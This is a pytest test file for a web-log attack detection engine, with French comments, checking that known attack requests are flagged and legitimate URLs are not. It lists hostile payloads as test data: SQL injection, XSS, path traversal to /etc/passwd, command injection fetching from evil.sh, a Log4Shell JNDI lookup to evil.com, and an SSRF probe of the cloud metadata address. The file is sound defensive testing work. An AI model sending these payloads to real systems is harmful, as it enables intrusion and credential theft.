"""
Tests du moteur de détection : ce qui DOIT être détecté, et ce qui ne doit PAS l'être.
Lancer : python -m pytest tests
"""
import pytest

from app.detection.engine import analyze
from app.detection.parsers import parse_http


def nginx(path: str, status: int = 404, ua: str = "Mozilla/5.0", ip: str = "45.155.205.7", size: int = 153) -> str:
    return f'{ip} - - [24/Oct/2026:10:00:00 +0000] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"'


ATTACKS = [
    ("/article/1' OR '1'='1", "Tentative d'Injection SQL"),
    ("/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--", "Tentative d'Injection SQL"),
    ("/user/1;%20DROP%20TABLE%20users--", "Tentative d'Injection SQL"),
    ("/item?id=1+AND+SLEEP(5)", "Tentative d'Injection SQL"),
    ("/search?q=<script>alert('XSS')</script>", "Tentative de Cross-Site Scripting (XSS)"),
    ("/page/%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E", "Tentative de Cross-Site Scripting (XSS)"),
    (r"/page/\x22><img src=x onerror=alert(1)>", "Tentative de Cross-Site Scripting (XSS)"),
    ("/search?q=%3Csvg%2Fonload%3Dalert(1)%3E", "Tentative de Cross-Site Scripting (XSS)"),
    ("/download/../../../../etc/passwd", "Tentative de Path Traversal"),
    ("/image/%2e%2e/%2e%2e/etc/passwd", "Tentative de Path Traversal"),
    ("/file?name=%252e%252e%252fetc", "Tentative de Path Traversal"),
    ("/.env", "Recherche de fichiers sensibles"),
    ("/.git/HEAD", "Recherche de fichiers sensibles"),
    ("/wp-login.php", "Recherche de fichiers sensibles"),
    ("/backup.sql", "Recherche de fichiers sensibles"),
    ("/ping?host=8.8.8.8;cat%20/etc/passwd", "Tentative d'Injection de Commande"),
    ("/ping?host=8.8.8.8;whoami", "Tentative d'Injection de Commande"),
    ("/x?cmd=$(curl%20evil.sh)", "Tentative d'Injection de Commande"),
    ("/?x=${jndi:ldap://evil.com/a}", "Tentative Log4Shell (Log4J)"),
    ("/fetch?url=http://169.254.169.254/latest/meta-data/", "Tentative de SSRF (Falsification de Requête Côté Serveur)"),
    ("/hello?name={{7*7}}", "Tentative d'Injection de Template (SSTI)"),
    ("/cgi-bin/luci/;stok=/locale", "Scan de vulnérabilités (Bot)"),
    ("/login?next=https://evil.example/phish", "Tentative de Redirection Ouverte"),
]


@pytest.mark.parametrize("path,expected", ATTACKS)
def test_attacks_detected(path, expected):
    ev = analyze(nginx(path), "web")
    assert ev["attack_type"] == expected, f"{path} -> {ev['attack_type']}"


@pytest.mark.parametrize("ua", ["sqlmap/1.7.2#stable", "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "Nikto/2.5.0", "nuclei - open-source project"])
def test_scanner_user_agents(ua):
    ev = analyze(nginx("/", status=200, ua=ua), "web")
    assert ev["attack_type"] == "Scan de vulnérabilités (Bot)"


LEGIT = [
    "/products?id=5&category=3",
    "/api/v1/users?page=2&sort=name",
    "/search?q=select+a+product+from+the+list",
    "/vegan-recipes",
    "/zapier/webhook",
    "/blog/how-to-pickle-vegetables",
    "/static/app.3f9a0c21.js",
    "/static/img/logo.0x1234abcd.png",
    "/api/session?token=abc&id=12",
    "/docs/../index.html",
    "/login?next=/dashboard",
    "/download?file=report-2026.pdf",
    "/en/select/from-our-catalog",
    "/api/items?filter=price>10&order=desc",
    "/health",
]


@pytest.mark.parametrize("path", LEGIT)
def test_no_false_positive(path):
    ev = analyze(nginx(path, status=200), "web")
    assert ev["attack_type"] is None, f"{path} -> {ev['attack_type']}"


def test_query_string_is_analyzed():
    # Bug de la v1 : seule la partie avant le "?" était inspectée
    ev = analyze(nginx("/search?q=1 UNION SELECT password FROM users"), "web")
    assert ev["attack_type"] == "Tentative d'Injection SQL"


def test_ignore_list_cannot_be_used_to_bypass(monkeypatch):
    # Bug de la v1 : ajouter "checkpoint" dans l'URL désactivait toute détection
    from app import config
    monkeypatch.setattr(config, "IGNORE_APP_LOG_SUBSTRINGS", ["checkpoint"])
    ev = analyze(nginx("/x?checkpoint&q=<script>alert(1)</script>"), "web")
    assert ev["attack_type"] is not None


def test_sensitive_file_served_is_critical():
    ev = analyze(nginx("/.env", status=200, size=812), "web")
    assert ev["attack_type"] == "Fichier sensible exposé"
    assert ev["severity"] == "critical"


def test_empty_200_is_not_an_exposed_file():
    # mailcow répond 200 vide pour /cache/* : nginx journalise 5 octets (« 0\r\n\r\n »)
    for size in (5, 0, "-"):
        ev = analyze(nginx("/cache/.env", status=200, size=size), "web")
        assert ev["attack_type"] == "Recherche de fichiers sensibles"
        assert ev["severity"] != "critical"


def test_app_log_alerts():
    ev = analyze("WARNING django.security.DisallowedHost Invalid HTTP_HOST header: 'evil.com'", "api")
    assert ev["kind"] == "app" and ev["attack_type"] == "Alerte interne de l'application"
    ev = analyze("2026-10-24 10:00:00 UTC [42] FATAL:  password authentication failed for user \"postgres\"", "db")
    assert ev["attack_type"] == "Échec d'authentification"


def test_bruteforce_detection():
    from app.detection.engine import Behavior
    b = Behavior()
    hits = [b.observe("185.220.101.9", "POST", "/login", "200") for _ in range(Behavior.BRUTE_LIMIT)]
    assert hits[-1] and hits[-1][0] == "Force brute"
    # Une IP interne (reverse proxy) n'est jamais considérée comme attaquante
    assert all(b.observe("172.18.0.2", "POST", "/login", "200") is None for _ in range(200))


@pytest.mark.parametrize("line,ip,path,status", [
    ('81.2.69.142 - - [24/Oct/2026:10:00:00 +0000] "GET /a?b=1 HTTP/1.1" 200 12 "-" "curl/8"', "81.2.69.142", "/a?b=1", "200"),
    ('INFO:     172.18.0.1:54321 - "POST /api/login HTTP/1.1" 401 Unauthorized', "172.18.0.1", "/api/login", "401"),
    ('[24/Oct/2026 10:00:00] "GET /admin/ HTTP/1.1" 302 0', "", "/admin/", "302"),
    ('172.18.0.3 - - [24/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 5 "-" "Mozilla" "81.2.69.160"', "81.2.69.160", "/", "200"),
    ('{"ClientHost":"81.2.69.161","RequestMethod":"GET","RequestPath":"/x","DownstreamStatus":404,"request_User-Agent":"sqlmap"}', "81.2.69.161", "/x", "404"),
    ('{"request":{"remote_ip":"81.2.69.162","method":"GET","uri":"/y","headers":{"User-Agent":["Go"]}},"status":200}', "81.2.69.162", "/y", "200"),
])
def test_parsers(line, ip, path, status):
    p = parse_http(line)
    assert p is not None
    assert (p["ip"], p["path"], p["status"]) == (ip, path, status)


def test_non_http_line():
    assert parse_http("Starting worker process 42") is None
